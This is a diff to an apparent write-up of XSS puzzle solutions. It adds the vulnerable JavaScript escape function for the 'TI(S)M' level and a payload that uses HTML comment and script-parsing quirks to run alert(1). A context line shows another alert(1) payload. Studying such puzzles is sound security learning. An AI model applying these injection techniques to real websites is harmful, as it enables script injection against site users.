@@ -135,7 +135,27 @@ Payload: `'#';alert(1);<!--`
 > TODO
 
 ## TI(S)M
-> TODO
+```js
+function escape(s) {
+  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
+  function html(s) { return s.replace(/[<>"&]/g, function(s) {
+                        return '&#' + s.charCodeAt(0) + ';'; }); }
+
+  return (
+    '<script>' +
+      'var url = ' + json(s) + '; // We\'ll use this later ' +
+    '</script>\n\n' +
+    '  <!-- for debugging -->\n' +
+    '  URL: ' + html(s) + '\n\n' +
+    '<!-- then suddenly -->\n' +
+    '<script>\n' +
+    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
+    '  else new Image().src = url;\n' +
+    '</script>'
+  );
+}
+```
+Payload: `http:/<!--<script>/|alert(1);if(/1//*`
 
 ## JSON 3
 ```js
